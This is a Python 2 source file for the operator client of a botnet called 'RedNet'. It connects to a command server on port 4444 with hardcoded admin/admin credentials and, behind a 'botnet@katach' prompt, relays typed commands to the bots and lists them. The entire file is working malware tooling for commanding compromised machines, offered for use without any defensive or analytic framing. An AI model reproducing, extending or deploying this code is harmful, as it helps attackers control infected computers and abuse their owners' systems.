import socket,argparse,platform
from sys import exit

if platform.system() == 'Linux': # Set colors to terminal
        red = '\033[31m'
        default_color = '\033[0;0m'
        blue = '\033[34m'
        os = 'Linux'
else:
    os = 'Windows'

BUFFER_SIZE     = 1024

user     = 'admin'
password = 'admin'

parser = argparse.ArgumentParser(description='RedNet - Botnet developed by Reddy')
parser.add_argument('--host', type=str, help='IP of server')
parser.add_argument('--port','-p', type=int, help='PORT of server', default=4444)
args = parser.parse_args()
if not args.host:
        parser.print_help()
        exit(0)
        
root_socket     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
root_socket.connect((args.host,args.port))
root_socket.send('admin')

def starting():
    print """
__/\\\________/\\\______/\\\\\\\\\______/\\\\\\\\\\\\\\\______/\\\\\\\\\____________/\\\\\\\\\___/\\\________/\\\_        
 _\/\\\_____/\\\//_____/\\\\\\\\\\\\\___\///////\\\/////_____/\\\\\\\\\\\\\_______/\\\////////___\/\\\_______\/\\\_       
  _\/\\\__/\\\//_______/\\\/////////\\\________\/\\\_________/\\\/////////\\\____/\\\/____________\/\\\_______\/\\\_      
   _\/\\\\\\//\\\______\/\\\_______\/\\\________\/\\\________\/\\\_______\/\\\___/\\\______________\/\\\\\\\\\\\\\\\_     
    _\/\\\//_\//\\\_____\/\\\\\\\\\\\\\\\________\/\\\________\/\\\\\\\\\\\\\\\__\/\\\______________\/\\\/////////\\\_    
     _\/\\\____\//\\\____\/\\\/////////\\\________\/\\\________\/\\\/////////\\\__\//\\\_____________\/\\\_______\/\\\_   
      _\/\\\_____\//\\\___\/\\\_______\/\\\________\/\\\________\/\\\_______\/\\\___\///\\\___________\/\\\_______\/\\\_  
       _\/\\\______\//\\\__\/\\\_______\/\\\________\/\\\________\/\\\_______\/\\\_____\////\\\\\\\\\__\/\\\_______\/\\\_ 
        _\///________\///___\///________\///_________\///_________\///________\///_________\/////////___\///________\///__
"""

def captureCommand():
    while True:
        try:
            if os == 'Linux':
                command = raw_input(red+'botnet@katach'+default_color+':'+blue+'~'+default_color+'# ')
            else:
                command = raw_input('botnet@katach:~# ')
            if not command:
                continue   
            elif '!exit' in command:
                raise SyntaxError
            elif '!bots' in command:
                sendCommands(addCredentials(command))
                print root_socket.recv(BUFFER_SIZE)
            else: 
                sendCommands(addCredentials(command))
        except SyntaxError:
            exit(0)
        except Exception:
            continue

def addCredentials(command):
    command  = user+'-'+password+'#'+command
    return command

def sendCommands(command):
    root_socket.send(command)

if __name__ == '__main__':
    starting()
    captureCommand()
